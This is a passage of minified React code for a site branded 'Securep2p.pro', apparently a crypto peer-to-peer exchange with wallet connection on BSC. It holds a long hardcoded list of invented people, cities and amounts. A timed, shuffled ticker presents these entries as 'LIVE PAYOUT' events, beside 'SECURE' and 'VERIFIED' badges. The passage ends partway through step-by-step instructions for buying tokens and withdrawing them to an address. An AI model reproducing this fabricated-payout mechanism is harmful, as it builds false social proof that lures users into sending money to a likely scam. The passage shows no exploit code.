    method: "UPI (India)"
}, {
    name: "Kiran Das",
    location: "Hyderabad, India",
    amount: "₹78,900 INR",
    method: "UPI (India)"
}, {
    name: "Sarah Adams",
    location: "London, UK",
    amount: "£5,400 GBP",
    method: "Bank Transfer"
}, {
    name: "Olga Ivanova",
    location: "Moscow, Russia",
    amount: "₽53,800 RUB",
    method: "Bank Transfer"
}, {
    name: "Lars Eriksen",
    location: "Stockholm, Sweden",
    amount: "kr12,700 SEK",
    method: "Swish"
}, {
    name: "Nora Schmidt",
    location: "Munich, Germany",
    amount: "€6,900 EUR",
    method: "SEPA"
}, {
    name: "Zhihao Li",
    location: "Shanghai, China",
    amount: "¥21,000 CNY",
    method: "Bank Transfer"
}, {
    name: "Fatou Ndiaye",
    location: "Dakar, Senegal",
    amount: "CFA 1,200,000 XOF",
    method: "Bank Transfer"
}, {
    name: "Luisa Moreira",
    location: "Lisbon, Portugal",
    amount: "€3,300 EUR",
    method: "MB WAY"
}, {
    name: "Thabo Ndlovu",
    location: "Johannesburg, South Africa",
    amount: "R18,900 ZAR",
    method: "Bank Transfer"
}, {
    name: "Santiago Torres",
    location: "Bogota, Colombia",
    amount: "$7,800,000 COP",
    method: "PSE"
}, {
    name: "Yuki Sato",
    location: "Osaka, Japan",
    amount: "¥340,000 JPY",
    method: "Bank Transfer"
}, {
    name: "Eva Karlsson",
    location: "Uppsala, Sweden",
    amount: "kr4,800 SEK",
    method: "Swish"
}, {
    name: "Martin Weber",
    location: "Zurich, Switzerland",
    amount: "Fr.19,000 CHF",
    method: "Bank Transfer"
}, {
    name: "Francisco Ramos",
    location: "Madrid, Spain",
    amount: "€9,600 EUR",
    method: "SEPA"
}, {
    name: "Svetlana Kuznetsova",
    location: "Saint Petersburg, Russia",
    amount: "₽34,900 RUB",
    method: "Bank Transfer"
}, {
    name: "Karim Morsi",
    location: "Cairo, Egypt",
    amount: "£E15,200 EGP",
    method: "Bank Transfer"
}, {
    name: "Isabel Fernandes",
    location: "Porto, Portugal",
    amount: "€4,700 EUR",
    method: "MB WAY"
}, {
    name: "Sebastian Bauer",
    location: "Berlin, Germany",
    amount: "€5,300 EUR",
    method: "SEPA"
}, {
    name: "Siti Nurhaliza",
    location: "Kuala Lumpur, Malaysia",
    amount: "RM9,800 MYR",
    method: "Bank Transfer"
}, {
    name: "John Smith",
    location: "New York, USA",
    amount: "$8,750 USD",
    method: "PayPal"
}, {
    name: "Aarav Singh",
    location: "Delhi, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Nisha Reddy",
    location: "Hyderabad, India",
    amount: "₹55,600 INR",
    method: "UPI (India)"
}, {
    name: "Karthik Srinivasan",
    location: "Bangalore, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Bhavesh Shah",
    location: "Ahmedabad, India",
    amount: "₹79,900 INR",
    method: "UPI (India)"
}, {
    name: "Vandana Rao",
    location: "Pune, India",
    amount: "₹43,850 INR",
    method: "UPI (India)"
}, {
    name: "Mahesh Sharma",
    location: "Chandigarh, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Neha Gupta",
    location: "Mumbai, India",
    amount: "₹88,200 INR",
    method: "UPI (India)"
}, {
    name: "Shreya Joshi",
    location: "Lucknow, India",
    amount: "₹73,400 INR",
    method: "UPI (India)"
}, {
    name: "Rahul Bhatia",
    location: "Delhi, India",
    amount: "₹97,400 INR",
    method: "UPI (India)"
}, {
    name: "Anjali Nair",
    location: "Bangalore, India",
    amount: "₹69,700 INR",
    method: "UPI (India)"
}, {
    name: "Arjun Mehta",
    location: "Kolkata, India",
    amount: "₹49,500 INR",
    method: "UPI (India)"
}, {
    name: "Parul Yadav",
    location: "Kanpur, India",
    amount: "₹84,300 INR",
    method: "UPI (India)"
}, {
    name: "Sagar Jain",
    location: "Mumbai, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Vivek Deshmukh",
    location: "Pune, India",
    amount: "₹66,800 INR",
    method: "UPI (India)"
}, {
    name: "Ritika Sinha",
    location: "Jaipur, India",
    amount: "₹78,400 INR",
    method: "UPI (India)"
}, {
    name: "Ajay Rao",
    location: "Chennai, India",
    amount: "₹41,700 INR",
    method: "UPI (India)"
}, {
    name: "Nisha Chauhan",
    location: "Delhi, India",
    amount: "₹87,100 INR",
    method: "UPI (India)"
}, {
    name: "Divya Sharma",
    location: "Bangalore, India",
    amount: "₹72,600 INR",
    method: "UPI (India)"
}, {
    name: "Sandeep Kumar",
    location: "Lucknow, India",
    amount: "₹53,200 INR",
    method: "UPI (India)"
}, {
    name: "Sonal Kaur",
    location: "Chandigarh, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Sumit Patel",
    location: "Ahmedabad, India",
    amount: "₹81,300 INR",
    method: "UPI (India)"
}, {
    name: "Raj Malhotra",
    location: "Delhi, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Aparna Sen",
    location: "Kolkata, India",
    amount: "₹99,900 INR",
    method: "UPI (India)"
}, {
    name: "Zara Sheikh",
    location: "Pune, India",
    amount: "₹76,700 INR",
    method: "UPI (India)"
}, {
    name: "Isha Sharma",
    location: "Mumbai, India",
    amount: "₹68,500 INR",
    method: "UPI (India)"
}, {
    name: "Kabir Kumar",
    location: "Hyderabad, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Aarti Patel",
    location: "Bangalore, India",
    amount: "₹89,900 INR",
    method: "UPI (India)"
}, {
    name: "Aditya Chauhan",
    location: "Delhi, India",
    amount: "₹94,100 INR",
    method: "UPI (India)"
}, {
    name: "Akhil Singh",
    location: "Chennai, India",
    amount: "₹55,000 INR",
    method: "UPI (India)"
}, {
    name: "Leena Verma",
    location: "Lucknow, India",
    amount: "₹82,100 INR",
    method: "UPI (India)"
}, {
    name: "Rashmi Nair",
    location: "Pune, India",
    amount: "₹72,500 INR",
    method: "UPI (India)"
}, {
    name: "Ritesh Gupta",
    location: "Kanpur, India",
    amount: "₹91,400 INR",
    method: "UPI (India)"
}, {
    name: "Tarun Ghosh",
    location: "Kolkata, India",
    amount: "₹88,800 INR",
    method: "UPI (India)"
}, {
    name: "Sanjana Kapoor",
    location: "Delhi, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Mehul Bansal",
    location: "Chandigarh, India",
    amount: "₹84,800 INR",
    method: "UPI (India)"
}, {
    name: "Snehal Desai",
    location: "Ahmedabad, India",
    amount: "₹93,900 INR",
    method: "UPI (India)"
}, {
    name: "Ajit Singh",
    location: "Jaipur, India",
    amount: "₹51,700 INR",
    method: "UPI (India)"
}, {
    name: "Ayaan Shah",
    location: "Delhi, India",
    amount: "₹99,500 INR",
    method: "UPI (India)"
}, {
    name: "Suhana Gupta",
    location: "Lucknow, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Sara Müller",
    location: "Berlin, Germany",
    amount: "€4,200 EUR",
    method: "SEPA"
}, {
    name: "Emilia Rossi",
    location: "Rome, Italy",
    amount: "€2,300 EUR",
    method: "SEPA"
}, {
    name: "Alice Dubois",
    location: "Paris, France",
    amount: "€3,700 EUR",
    method: "SEPA"
}, {
    name: "Mariana Santos",
    location: "Rio de Janeiro, Brazil",
    amount: "R$4,800 BRL",
    method: "Pix"
}, {
    name: "Lin Wei",
    location: "Hong Kong",
    amount: "HK$32,100 HKD",
    method: "FPS"
}, {
    name: "Fatima Zahra",
    location: "Casablanca, Morocco",
    amount: "د.م.11,200 MAD",
    method: "Bank Transfer"
}, {
    name: "Omar Rahman",
    location: "Cairo, Egypt",
    amount: "£E9,300 EGP",
    method: "Bank Transfer"
}, {
    name: "Chen Wei",
    location: "Shanghai, China",
    amount: "¥28,300 CNY",
    method: "Bank Transfer"
}, {
    name: "Li Ming",
    location: "Beijing, China",
    amount: "¥41,900 CNY",
    method: "Bank Transfer"
}, {
    name: "Zhang Hui",
    location: "Shenzhen, China",
    amount: "¥25,600 CNY",
    method: "Bank Transfer"
}, {
    name: "Wang Fang",
    location: "Guangzhou, China",
    amount: "¥39,000 CNY",
    method: "Bank Transfer"
}, {
    name: "Zhou Li",
    location: "Chengdu, China",
    amount: "¥19,500 CNY",
    method: "Bank Transfer"
}, {
    name: "Tang Lin",
    location: "Wuhan, China",
    amount: "¥31,200 CNY",
    method: "Bank Transfer"
}, {
    name: "Sun Fei",
    location: "Hong Kong",
    amount: "HK$47,800 HKD",
    method: "FPS"
}, {
    name: "Guo Yan",
    location: "Macau, China",
    amount: "MOP$17,200 MOP",
    method: "Bank Transfer"
}, {
    name: "Liu Ying",
    location: "Nanjing, China",
    amount: "¥22,100 CNY",
    method: "Bank Transfer"
}, {
    name: "Qian Qi",
    location: "Hong Kong",
    amount: "HK$13,900 HKD",
    method: "FPS"
}, {
    name: "John Turner",
    location: "New York, USA",
    amount: "$9,650 USD",
    method: "ACH"
}, {
    name: "Emily Clark",
    location: "Toronto, Canada",
    amount: "C$7,800 CAD",
    method: "Bank Transfer"
}, {
    name: "Michael Brown",
    location: "Dallas, USA",
    amount: "$13,200 USD",
    method: "PayPal"
}, {
    name: "Sarah White",
    location: "Montreal, Canada",
    amount: "C$5,600 CAD",
    method: "PayPal"
}, {
    name: "Daniel Miller",
    location: "San Francisco, USA",
    amount: "$22,000 USD",
    method: "Bank Transfer"
}, {
    name: "Linda Scott",
    location: "Vancouver, Canada",
    amount: "C$11,900 CAD",
    method: "PayPal"
}, {
    name: "Brian Harris",
    location: "Houston, USA",
    amount: "$7,800 USD",
    method: "Bank Transfer"
}, {
    name: "Jessica Evans",
    location: "Calgary, Canada",
    amount: "C$3,250 CAD",
    method: "Bank Transfer"
}, {
    name: "Kevin Carter",
    location: "Los Angeles, USA",
    amount: "$14,800 USD",
    method: "ACH"
}, {
    name: "Olivia Hall",
    location: "Ottawa, Canada",
    amount: "C$8,400 CAD",
    method: "PayPal"
}, {
    name: "David Lee",
    location: "Boston, USA",
    amount: "$10,300 USD",
    method: "Bank Transfer"
}, {
    name: "Rebecca King",
    location: "Edmonton, Canada",
    amount: "C$2,950 CAD",
    method: "Bank Transfer"
}, {
    name: "Steven Wright",
    location: "Chicago, USA",
    amount: "$6,100 USD",
    method: "PayPal"
}, {
    name: "Anna Young",
    location: "Quebec City, Canada",
    amount: "C$4,850 CAD",
    method: "Bank Transfer"
}, {
    name: "Paul Walker",
    location: "Miami, USA",
    amount: "$5,400 USD",
    method: "ACH"
}, {
    name: "Natalie Adams",
    location: "Hamilton, Canada",
    amount: "C$1,700 CAD",
    method: "PayPal"
}, {
    name: "Christopher Moore",
    location: "Philadelphia, USA",
    amount: "$16,800 USD",
    method: "Bank Transfer"
}, {
    name: "Isabella Green",
    location: "Winnipeg, Canada",
    amount: "C$6,700 CAD",
    method: "Bank Transfer"
}, {
    name: "Mark Thompson",
    location: "Seattle, USA",
    amount: "$8,900 USD",
    method: "PayPal"
}, {
    name: "Lauren Martin",
    location: "Halifax, Canada",
    amount: "C$3,800 CAD",
    method: "Bank Transfer"
}, {
    name: "Richard Perez",
    location: "Las Vegas, USA",
    amount: "$11,200 USD",
    method: "ACH"
}, {
    name: "Victoria Robinson",
    location: "London, Canada",
    amount: "C$2,950 CAD",
    method: "PayPal"
}, {
    name: "Charles White",
    location: "Denver, USA",
    amount: "$7,000 USD",
    method: "Bank Transfer"
}, {
    name: "Amy Lewis",
    location: "Victoria, Canada",
    amount: "C$6,200 CAD",
    method: "PayPal"
}, {
    name: "Suresh Kumar",
    location: "Delhi, India",
    amount: "₹45,000 INR",
    method: "IMPS (India)"
}, {
    name: "Priya Joshi",
    location: "Pune, India",
    amount: "₹88,700 INR",
    method: "IMPS (India)"
}, {
    name: "Amit Sharma",
    location: "Bangalore, India",
    amount: "₹56,300 INR",
    method: "IMPS (India)"
}, {
    name: "Vikas Mehta",
    location: "Mumbai, India",
    amount: "₹81,500 INR",
    method: "IMPS (India)"
}, {
    name: "Meena Nair",
    location: "Chennai, India",
    amount: "₹27,900 INR",
    method: "IMPS (India)"
}, {
    name: "Rohit Patel",
    location: "Ahmedabad, India",
    amount: "₹92,800 INR",
    method: "IMPS (India)"
}, {
    name: "Anjali Sinha",
    location: "Lucknow, India",
    amount: "₹38,500 INR",
    method: "IMPS (India)"
}]
  , Wf = ({darkMode: e, setDarkMode: t, walletConnected: n, walletAddress: r, showWalletAnimation: s, themeClasses: i, isMobile: o=!1}) => {
    const [l,u] = kt.useState([])
      , [c,m] = kt.useState(0)
      , [h,x] = kt.useState(!0)
      , [y,v] = kt.useState(20)
      , {t: k} = qo()
      , p = 2e4
      , f = 500
      , d = "payoutTimer"
      , g = "payoutQueue";
    kt.useEffect( () => {
        const w = W => {
            const F = [...W];
            for (let T = F.length - 1; T > 0; T--) {
                const $ = Math.floor(Math.random() * (T + 1));
                [F[T],F[$]] = [F[$], F[T]]
            }
            return F
        }
          , j = Date.now();
        let B = localStorage.getItem(d);
        B || (B = j.toString(),
        localStorage.setItem(d, B));
        const b = j - parseInt(B)
          , N = Math.floor(b / p)
          , P = b % p;
        let M = localStorage.getItem(g), U;
        M ? U = JSON.parse(M) : (U = w(Array.from({
            length: or.length
        }, (W, F) => F)),
        localStorage.setItem(g, JSON.stringify(U)));
        const D = N % U.length;
        if (N > 0 && N % U.length === 0 && P < 1e3) {
            const W = w(Array.from({
                length: or.length
            }, (F, T) => T));
            U = W,
            localStorage.setItem(g, JSON.stringify(W))
        }
        u(U),
        m(U[D]);
        const A = P < p - f;
        x(A);
        const O = Math.ceil((p - P) / 1e3);
        v(O)
    }
    , []),
    kt.useEffect( () => {
        if (l.length === 0)
            return;
        const w = () => {
            const B = Date.now()
              , b = parseInt(localStorage.getItem(d) || B.toString())
              , N = B - b
              , P = Math.floor(N / p)
              , M = N % p
              , U = Math.ceil((p - M) / 1e3);
            v(U);
            const D = M < p - f;
            x(D);
            const A = P % l.length
              , O = l[A];
            if (c !== O)
                if (P > 0 && P % l.length === 0) {
                    const F = (T => {
                        const $ = [...T];
                        for (let z = $.length - 1; z > 0; z--) {
                            const L = Math.floor(Math.random() * (z + 1));
                            [$[z],$[L]] = [$[L], $[z]]
                        }
                        return $
                    }
                    )(Array.from({
                        length: or.length
                    }, (T, $) => $));
                    u(F),
                    localStorage.setItem(g, JSON.stringify(F)),
                    m(F[0])
                } else
                    m(O)
        }
        ;
        w();
        const j = setInterval(w, 100);
        return () => clearInterval(j)
    }
    , [l]);
    const S = or[c];
    return a.jsxs(a.Fragment, {
        children: [a.jsx("header", {
            className: `${i.cardBg}/80 backdrop-blur-xl border-b ${i.border} sticky top-0 z-40 shadow-lg ${o && n ? "py-2" : ""}`,
            children: a.jsx("div", {
                className: "max-w-7xl mx-auto px-3 sm:px-4 lg:px-8",
                children: a.jsxs("div", {
                    className: `flex justify-between items-center ${o && n ? "h-12" : "h-16 sm:h-20"}`,
                    children: [a.jsx("div", {
                        className: `flex items-center space-x-2 sm:space-x-3 flex-shrink-0 ${o && n ? "scale-75" : ""}`,
                        children: a.jsxs("div", {
                            className: "flex items-center",
                            children: [a.jsx("div", {
                                className: `${o && n ? "w-6 h-6" : "w-8 h-8 sm:w-10 sm:h-10 lg:w-12 lg:h-12"} bg-gradient-to-r ${i.gradient} rounded-lg sm:rounded-xl flex items-center justify-center shadow-xl`,
                                children: a.jsx(pt, {
                                    className: `${o && n ? "w-3 h-3" : "w-4 h-4 sm:w-5 sm:h-5 lg:w-7 lg:h-7"} text-white`
                                })
                            }), a.jsxs("div", {
                                className: `${o && n ? "ml-1" : "ml-2"}`,
                                children: [a.jsx("span", {
                                    className: `${o && n ? "text-sm" : "text-lg sm:text-xl lg:text-2xl"} font-bold ${i.text}`,
                                    children: "Securep2p.pro"
                                }), !(o && n) && a.jsxs("div", {
                                    className: "flex items-center space-x-2 mt-1",
                                    children: [a.jsx("span", {
                                        className: "text-xs bg-green-500/20 text-green-400 px-1.5 py-0.5 rounded-full font-medium",
                                        children: "SECURE"
                                    }), a.jsx("span", {
                                        className: "text-xs bg-blue-500/20 text-blue-400 px-1.5 py-0.5 rounded-full font-medium",
                                        children: "VERIFIED"
                                    })]
                                })]
                            })]
                        })
                    }), !(o && n) && a.jsxs("div", {
                        className: "hidden md:flex items-center space-x-4 lg:space-x-6",
                        children: [a.jsxs("div", {
                            className: "flex items-center space-x-3 lg:space-x-4 text-xs",
                            children: [a.jsxs("div", {
                                className: "flex items-center",
                                children: [a.jsx("div", {
                                    className: "w-2 h-2 bg-green-500 rounded-full mr-2 animate-pulse"
                                }), a.jsx("span", {
                                    className: i.textSecondary,
                                    children: k("header.liveRates")
                                })]
                            }), a.jsxs("div", {
                                className: "flex items-center",
                                children: [a.jsx(vf, {
                                    className: "w-4 h-4 text-green-600 mr-1"
                                }), a.jsx("span", {
                                    className: i.textSecondary,
                                    children: k("header.connected")
                                })]
                            })]
                        }), n && a.jsxs("div", {
                            className: `flex items-center bg-gradient-to-r ${e ? "from-green-900/10 to-emerald-900/10" : "from-green-50 to-emerald-50"} border ${e ? "border-green-800/30" : "border-green-200"} px-3 py-2 rounded-lg lg:rounded-xl transition-all duration-500 backdrop-blur-sm ${s ? "ring-4 ring-green-300 ring-opacity-50 scale-105" : ""}`,
                            children: [a.jsx("div", {
                                className: "w-3 h-3 bg-green-500 rounded-full mr-2 animate-pulse"
                            }), a.jsxs("div", {
                                className: "text-xs",
                                children: [a.jsxs("div", {
                                    className: `font-medium ${e ? "text-green-300" : "text-green-800"}`,
                                    children: [r.slice(0, 6), "...", r.slice(-4)]
                                }), a.jsx("div", {
                                    className: `text-xs ${e ? "text-green-400" : "text-green-600"} hidden lg:block`,
                                    children: "BSC Network"
                                })]
                            }), s && a.jsx("div", {
                                className: "ml-1 lg:ml-2",
                                children: a.jsx(tt, {
                                    className: "w-5 h-5 text-green-600 animate-bounce"
                                })
                            })]
                        })]
                    }), !(o && n) && a.jsxs("div", {
                        className: "flex items-center space-x-2",
                        children: [a.jsx(zf, {
                            darkMode: e,
                            themeClasses: i
                        }), a.jsx("button", {
                            onClick: () => {
                                const w = !e;
                                t(w),
                                localStorage.setItem("theme", w ? "dark" : "light")
                            }
                            ,
                            className: `p-2 rounded-lg sm:rounded-xl ${i.hover} transition-all duration-200 border ${i.border}`,
                            children: e ? a.jsx(gf, {
                                className: `w-4 h-4 sm:w-5 sm:h-5 ${i.text}`
                            }) : a.jsx(hf, {
                                className: `w-4 h-4 sm:w-5 sm:h-5 ${i.text}`
                            })
                        })]
                    })]
                })
            })
        }), !(o && n) && a.jsxs("div", {
            className: `${e ? "bg-gradient-to-r from-blue-900/50 via-cyan-900/50 to-blue-900/50" : "bg-gradient-to-r from-blue-600 via-cyan-600 to-blue-600"} text-white py-2 sm:py-3 overflow-hidden relative border-b border-blue-500/30 backdrop-blur-sm`,
            children: [a.jsx("div", {
                className: "absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent animate-pulse"
            }), a.jsxs("div", {
                className: "max-w-7xl mx-auto px-3 sm:px-4 lg:px-8",
                children: [a.jsxs("div", {
                    className: `hidden lg:flex items-center justify-center space-x-4 transition-all duration-300 ${h ? "opacity-100 transform translate-y-0" : "opacity-0 transform -translate-y-2"}`,
                    children: [a.jsxs("div", {
                        className: "flex items-center space-x-2",
                        children: [a.jsx("div", {
                            className: "w-2 h-2 bg-white rounded-full animate-pulse"
                        }), a.jsx("span", {
                            className: "text-sm font-medium",
                            children: k("header.livePayout")
                        })]
                    }), a.jsxs("div", {
                        className: "flex items-center space-x-2 bg-white/20 rounded-full px-3 py-1 backdrop-blur-sm",
                        children: [a.jsx(Ra, {
                            className: "w-4 h-4"
                        }), a.jsx("span", {
                            className: "text-sm font-semibold",
                            children: S.name
                        })]
                    }), a.jsxs("div", {
                        className: "flex items-center space-x-2",
                        children: [a.jsx("span", {
                            className: "text-xs text-blue-100",
                            children: "from"
                        }), a.jsx("span", {
                            className: "text-sm font-medium",
                            children: S.location
                        })]
                    }), a.jsxs("div", {
                        className: "flex items-center space-x-2 bg-white/20 rounded-full px-3 py-1 backdrop-blur-sm",
                        children: [a.jsx(Tn, {
                            className: "w-4 h-4"
                        }), a.jsx("span", {
                            className: "text-sm font-bold",
                            children: S.amount
                        })]
                    }), a.jsxs("div", {
                        className: "flex items-center space-x-2",
                        children: [a.jsx("span", {
                            className: "text-xs text-blue-100",
                            children: "via"
                        }), a.jsx("span", {
                            className: "text-sm font-medium bg-white/20 rounded-full px-2 py-1",
                            children: S.method
                        })]
                    }), a.jsxs("div", {
                        className: "flex items-center space-x-1",
                        children: [a.jsx("div", {
                            className: "w-1 h-1 bg-white rounded-full animate-bounce"
                        }), a.jsx("div", {
                            className: "w-1 h-1 bg-white rounded-full animate-bounce delay-100"
                        }), a.jsx("div", {
                            className: "w-1 h-1 bg-white rounded-full animate-bounce delay-200"
                        })]
                    })]
                }), a.jsx("div", {
                    className: `lg:hidden transition-all duration-300 ${h ? "opacity-100 transform translate-y-0" : "opacity-0 transform -translate-y-2"}`,
                    children: a.jsxs("div", {
                        className: "flex items-center justify-between px-1 sm:px-2",
                        children: [a.jsxs("div", {
                            className: "flex items-center space-x-2",
                            children: [a.jsxs("div", {
                                className: "flex items-center space-x-2",
                                children: [a.jsx("div", {
                                    className: "w-2 h-2 bg-white rounded-full animate-pulse"
                                }), a.jsx("span", {
                                    className: "text-xs font-bold bg-white/20 rounded-full px-1.5 py-0.5 backdrop-blur-sm whitespace-nowrap",
                                    children: "LIVE PAYOUT"
                                })]
                            }), a.jsxs("div", {
                                className: "flex items-center space-x-1 min-w-0",
                                children: [a.jsx("div", {
                                    className: "w-5 h-5 bg-white/20 rounded-full flex items-center justify-center",
                                    children: a.jsx(Ra, {
                                        className: "w-2.5 h-2.5"
                                    })
                                }), a.jsxs("div", {
                                    className: "min-w-0",
                                    children: [a.jsx("div", {
                                        className: "text-xs font-bold truncate max-w-16 sm:max-w-20",
                                        children: S.name
                                    }), a.jsx("div", {
                                        className: "text-xs text-blue-100 truncate max-w-16 sm:max-w-20",
                                        children: S.location
                                    })]
                                })]
                            })]
                        }), a.jsxs("div", {
                            className: "text-right",
                            children: [a.jsx("div", {
                                className: "text-xs font-bold text-white whitespace-nowrap",
                                children: S.amount
                            }), a.jsxs("div", {
                                className: "flex items-center space-x-1 mt-1",
                                children: [a.jsx(tt, {
                                    className: "w-2.5 h-2.5 text-blue-300"
                                }), a.jsxs("span", {
                                    className: "text-xs text-blue-100 font-medium whitespace-nowrap",
                                    children: ["via ", S.method]
                                })]
                            })]
                        })]
                    })
                })]
            })]
        })]
    })
}
  , kc = ({currentStep: e, loading: t, tokens: n, selectedToken: r, tradeAmount: s, tokenPrice: i, priceLoading: o, priceError: l, darkMode: u, themeClasses: c, connectWallet: m, setSelectedToken: h, setTradeAmount: x, setSellAmount: y, setQuote: v, setCurrentStep: k}) => {
    var S;
    const {t: p} = qo()
      , [f,d] = E.useState(!1)
      , g = () => a.jsxs("div", {
        className: `bg-gradient-to-r ${u ? "from-green-900/20 to-blue-900/20" : "from-green-50 to-blue-50"} rounded-3xl border ${u ? "border-green-800" : "border-green-200"} p-8 mb-10 max-w-4xl mx-auto mt-8 shadow-lg`,
        children: [a.jsxs("h3", {
            className: `text-2xl font-bold ${u ? "text-green-300" : "text-green-900"} mb-6 flex items-center justify-center gap-2`,
            children: [a.jsx(pt, {
                className: "w-7 h-7 text-green-600"
            }), p("exchange.howToTransfer")]
        }), a.jsx("div", {
            className: "mb-8",
            children: a.jsxs("div", {
                className: `bg-gradient-to-r ${u ? "from-blue-900/30 to-purple-900/30" : "from-blue-50 to-purple-50"} rounded-2xl p-6 border ${u ? "border-blue-800" : "border-blue-200"} mb-6`,
                children: [a.jsxs("h4", {
                    className: `text-xl font-bold ${c.text} mb-2 flex items-center gap-2`,
                    children: [a.jsx("div", {
                        className: "w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center text-white font-bold",
                        children: "1"
                    }), p("exchange.convertTitle")]
                }), a.jsx("p", {
                    className: `text-sm ${c.textSecondary} mb-4`,
                    children: p("exchange.convertSubtitle")
                }), a.jsxs("div", {
                    className: "space-y-3",
                    children: [a.jsx("div", {
                        className: `${c.cardBg} rounded-xl p-3 border ${c.border}`,
                        children: a.jsxs("p", {
                            className: `text-sm ${c.text}`,
                            children: ["• ", p("exchange.convertStep1")]
                        })
                    }), a.jsx("div", {
                        className: `${c.cardBg} rounded-xl p-3 border ${c.border}`,
                        children: a.jsxs("p", {
                            className: `text-sm ${c.text}`,
                            children: ["• ", p("exchange.convertStep2")]
                        })
                    }), a.jsx("div", {
                        className: `${c.cardBg} rounded-xl p-3 border ${c.border}`,
                        children: a.jsxs("p", {
                            className: `text-sm ${c.text}`,
                            children: ["• ", p("exchange.convertStep3")]
                        })
                    }), a.jsx("div", {
                        className: `${c.cardBg} rounded-xl p-3 border ${c.border}`,
                        children: a.jsxs("p", {
                            className: `text-sm ${c.text}`,
                            children: ["• ", p("exchange.convertStep4")]
                        })
                    }), a.jsxs("div", {
                        className: `bg-gradient-to-r ${u ? "from-yellow-900/20 to-orange-900/20" : "from-yellow-50 to-orange-50"} rounded-xl p-4 border ${u ? "border-yellow-700" : "border-yellow-200"}`,
                        children: [a.jsx("h5", {
                            className: `font-semibold ${u ? "text-yellow-300" : "text-yellow-800"} mb-2`,
                            children: "Exchange-Specific Instructions:"
                        }), a.jsxs("div", {
                            className: "space-y-2 text-sm",
                            children: [a.jsxs("p", {
                                className: `${u ? "text-yellow-200" : "text-yellow-700"}`,
                                children: ["• ", p("exchange.convertBinance")]
                            }), a.jsxs("p", {
                                className: `${u ? "text-yellow-200" : "text-yellow-700"}`,
                                children: ["• ", p("exchange.convertKucoin")]
                            }), a.jsxs("p", {
                                className: `${u ? "text-yellow-200" : "text-yellow-700"}`,
                                children: ["• ", p("exchange.convertOthers")]
                            })]
                        })]
                    }), a.jsx("div", {
                        className: `${c.cardBg} rounded-xl p-3 border-2 border-green-500`,
                        children: a.jsxs("p", {
                            className: "text-sm font-semibold text-green-600",
                            children: ["✅ ", p("exchange.convertConfirm")]
                        })
                    })]
                })]
            })
        }), a.jsx("div", {
            className: "mb-8",
            children: a.jsxs("div", {
                className: `bg-gradient-to-r ${u ? "from-orange-900/30 to-red-900/30" : "from-orange-50 to-red-50"} rounded-2xl p-6 border ${u ? "border-orange-800" : "border-orange-200"} mb-6`,
                children: [a.jsxs("h4", {
                    className: `text-xl font-bold ${c.text} mb-2 flex items-center gap-2`,
                    children: [a.jsx("div", {
                        className: "w-8 h-8 bg-orange-500 rounded-full flex items-center justify-center text-white font-bold",
                        children: "2"
                    }), p("exchange.prepareTitle")]
                }), a.jsx("p", {
                    className: `text-sm ${c.textSecondary} mb-3`,
                    children: p("exchange.prepareDesc")
                }), a.jsx("p", {
                    className: `text-sm ${u ? "text-orange-300" : "text-orange-700"} mb-4 font-medium`,
                    children: p("exchange.prepareNote")
                }), a.jsxs("div", {
                    className: "space-y-3",
                    children: [a.jsx("div", {
                        className: `${c.cardBg} rounded-xl p-3 border ${c.border}`,
                        children: a.jsx("p", {
                            className: `text-sm font-semibold ${c.text}`,
                            children: "What to do:"
                        })
                    }), a.jsx("div", {
                        className: `${c.cardBg} rounded-xl p-3 border ${c.border}`,
                        children: a.jsxs("p", {
                            className: `text-sm ${c.text}`,
                            children: ["• ", p("exchange.prepareBuy")]
                        })
                    }), a.jsx("div", {
                        className: `${c.cardBg} rounded-xl p-3 border ${c.border}`,
                        children: a.jsxs("p", {
                            className: `text-sm ${c.text}`,
                            children: ["• ", p("exchange.prepareHow")]
                        })
                    })]
                })]
            })
        }), a.jsx("div", {
            className: "mb-8",
            children: a.jsxs("div", {
                className: `bg-gradient-to-r ${u ? "from-green-900/30 to-emerald-900/30" : "from-green-50 to-emerald-50"} rounded-2xl p-6 border ${u ? "border-green-800" : "border-green-200"} mb-6`,
                children: [a.jsxs("h4", {
                    className: `text-xl font-bold ${c.text} mb-4 flex items-center gap-2`,
                    children: [a.jsx("div", {
                        className: "w-8 h-8 bg-green-500 rounded-full flex items-center justify-center text-white font-bold",
                        children: "3"
                    }), p("exchange.withdrawTitle")]
                }), a.jsxs("div", {
                    className: "space-y-4",
                    children: [a.jsx("div", {
                        className: `${c.cardBg} rounded-xl p-3 border ${c.border}`,
                        children: a.jsxs("p", {
                            className: `text-sm ${c.text}`,
                            children: ["• ", p("exchange.withdrawStep1")]
                        })
                    }), a.jsx("div", {
                        className: `${c.cardBg} rounded-xl p-3 border ${c.border}`,
                        children: a.jsxs("p", {
                            className: `text-sm ${c.text}`,
                            children: ["• ", p("exchange.withdrawStep2")]
                        })
                    }), a.jsxs("div", {
                        className: `bg-gradient-to-r ${u ? "from-red-900/20 to-pink-900/20" : "from-red-50 to-pink-50"} rounded-xl p-4 border-2 ${u ? "border-red-700" : "border-red-300"}`,
                        children: [a.jsx("h5", {
                            className: `font-bold ${u ? "text-red-300" : "text-red-800"} mb-2`,
                            children: p("exchange.networkTitle")
                        }), a.jsxs("p", {
                            className: `text-sm ${u ? "text-red-200" : "text-red-700"} mb-2`,
                            children: ["• ", p("exchange.networkSelect")]
                        }), a.jsx("p", {
                            className: `text-sm font-bold ${u ? "text-red-300" : "text-red-800"}`,
                            children: p("exchange.networkWarning")
                        })]
                    }), a.jsxs("div", {
                        className: `${c.cardBg} rounded-xl p-4 border ${c.border}`,
                        children: [a.jsx("h5", {
                            className: `font-semibold ${c.text} mb-3`,
                            children: p("exchange.addressTitle")
                        }), a.jsxs("div", {
                            className: "space-y-2 text-sm",
                            children: [a.jsxs("p", {
                                className: `${c.text}`,
                                children: ["• ", p("exchange.addressStep1")]
                            }), a.jsxs("p", {
